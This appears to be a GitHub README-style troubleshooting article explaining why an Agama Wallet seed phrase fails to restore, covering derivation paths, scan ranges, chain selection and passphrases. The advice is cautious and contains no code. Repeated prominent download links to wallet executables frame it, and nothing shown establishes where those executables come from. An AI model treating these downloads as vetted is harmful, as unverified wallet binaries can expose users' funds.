[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Why a Seed Phrase Fails to Restore a Wallet

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A seed phrase usually fails to restore for one of four reasons: a word is wrong or out of order, the software derives different addresses than the one that created the wallet, the scan range is too narrow, or the phrase is valid but belongs to a different wallet. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its Restore Wallet flow takes the phrase and a password, nothing else.

## You'll see this if

The phrase was accepted, the wallet opened, and the balance is empty or partial, or the phrase was rejected outright.

| Outcome | Likely cause | Check |
|---|---|---|
| Accepted, balance empty | Derivation or scan range | Look for a known address |
| Accepted, partial balance | Scan still running | Watch block height |
| Rejected | Word, order or spelling | Compare with the written record |
| Accepted, wrong asset only | Chain or asset selection | Confirm which chain you are restoring |
| Accepted, then a crash | Software fault | Try a different build or machine |

## Why it happens

The phrase is not the wallet. It is a number, encoded as words, from which keys and addresses are derived by a rule. Two wallets applying different rules to the same phrase produce different addresses, both valid, one of them empty.

Three things vary between implementations:

- **Derivation path.** The rule that turns the master secret into a sequence of keys. Wallets differ, and some offer a choice.
- **Address range.** How many addresses are derived and checked before the wallet stops. A narrow range misses funds on later addresses.
- **Chain and asset selection.** A phrase restored into the wrong chain produces valid addresses for a ledger that holds nothing.

There is also a historical layer specific to this ecosystem: wallets of that generation did not universally follow the same standard, and reports from users describe the same phrase opening different addresses in different software. That is a derivation difference, not corruption.

## Fix

Diagnose in this order, cheapest first.

1. **Check the words against your record.** Count, order, spelling. Single spaces, no punctuation.
2. **Check the chain.** Confirm the wallet is reading the chain that holds the funds.
3. **Look for a known address.** If you recorded one, its absence points at derivation or range.
4. **Widen the scan** if the software exposes a gap limit.
5. **Try software that offers derivation options.** Some do; that is the practical fix for a mismatch.
6. **Only then suspect the phrase itself.** A phrase that produces a valid wallet is almost certainly correct.

Never type the phrase into a website, a chat or a "checker", and never send it to anyone offering to diagnose a restore. Recovery happens inside wallet software, and nowhere else.

## If that did not work

If a phrase is rejected by one wallet and accepted by another, the difference is validation strictness rather than the phrase. A wallet that rejects it outright is usually catching an error the other tolerates.

If a phrase is accepted everywhere and always empty, the funds may be on addresses derived by a rule none of the software you have implements. That is a genuine compatibility problem, and the answer is software that supports the derivation rather than more attempts.

If a balance appears and then disappears, a rescan is running. [Zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) covers the sequence.

If the phrase came from a wallet involved in the 2019 incident, treat it as exposed and move the funds to a new wallet once access is restored.

## Prevention

- **Write the phrase at creation, by hand.** Not later, not from a screenshot.
- **Record one address per asset.** It is the check that distinguishes derivation from loss.
- **Note the software that created the wallet.** It narrows the derivation question later.
- **Test a restore before you need it.** [Backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers storage.
- **Do not reuse phrases across wallets.** [Restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) covers the procedure, and [is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) covers what a wallet build itself can expose.

## FAQ

### Can a phrase be valid and still restore nothing?

Yes. Validity means the words form a correct number; it says nothing about which addresses your software derives from it.

### Why does the wallet ask for a password during restore?

The password encrypts the local store on the new device; it is not part of the phrase and cannot recover anything. Choosing one you have not used elsewhere limits the damage if the device is later compromised.

### Does word order matter?

Yes. The same words in a different order encode a different number, which is why a transposition produces an empty wallet rather than an error.

### Why do two wallets show different balances for one phrase?

Because they derive different address sets, or scan different ranges. The chain did not change; the view did.

### Does a passphrase change the result?

If a wallet used an additional passphrase alongside the phrase, restoring without it produces a different, valid, empty wallet. That is one of the few cases where the words are right and the result is still nothing, and it is worth checking before assuming loss.

### Can a phrase restore a wallet made by different software?

Sometimes. Portability depends on the derivation rule, which is exactly why the same words can work in one wallet and fail in another, and why the [restore procedure](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) starts with a check rather than a promise.

### Is it safe to try the phrase in several wallets?

Each attempt is another place the phrase is exposed. Prefer software you have chosen deliberately, and never a website or an online checker.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md)
- [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md)
